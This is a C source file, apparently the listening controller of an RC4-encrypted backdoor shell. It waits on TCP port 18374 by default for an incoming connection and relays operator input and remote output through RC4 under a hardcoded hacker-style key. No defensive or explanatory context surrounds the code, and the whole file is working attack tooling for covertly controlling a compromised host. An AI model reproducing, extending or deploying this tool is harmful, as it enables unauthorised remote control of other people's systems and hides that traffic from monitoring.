#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "rc4.h"

char password[] = "m4st3rh4x0r";
int shell(int);

void net_listen(int);

int main(int argc, char **argv)
{
  int port = 18374;
  int sockfd;
  struct sockaddr_in sin;

  if(argv[1]) 
    port = atoi(argv[1]);

  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  sin.sin_addr.s_addr = INADDR_ANY;

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    exit(-1);

  if(bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    exit(-1);

  printf("listening on port %d\n", port);

  if(listen(sockfd, 10) < 0)
    exit(-1);

  net_listen(sockfd);
  exit(0);
}

void net_listen(int sockfd)
{
  int newfd, size;
  struct sockaddr_in sin;

  size = sizeof(sin);

  if((newfd = accept(sockfd, (struct sockaddr *)&sin, &size)) < 0)
    return;

  puts("connected!");

  shell(newfd);
  close(newfd);
  close(sockfd);
}

int shell(int sockfd)
{
  int n;
  char buf[1024];
  fd_set rfds;

  for(;;) {
       FD_ZERO(&rfds);
       FD_SET(sockfd, &rfds);
       FD_SET(0, &rfds);

       select(sockfd + 1, &rfds, NULL, NULL, NULL);

       if(FD_ISSET(0, &rfds)) {

         if((n = read(0, buf, sizeof(buf))) <= 0)
           return(-1);

         rc4crypt(password, strlen(password), buf, n);

         if(write(sockfd, buf, n) < 0)
           return(-1);
       }


       if(FD_ISSET(sockfd, &rfds)) {

         if((n = read(sockfd, buf, sizeof(buf))) <= 0)
           return(-1);

         rc4crypt(password, strlen(password), buf, n);

         if(write(0, buf, n) < 0)
           return(-1);

       }
  }
}
 
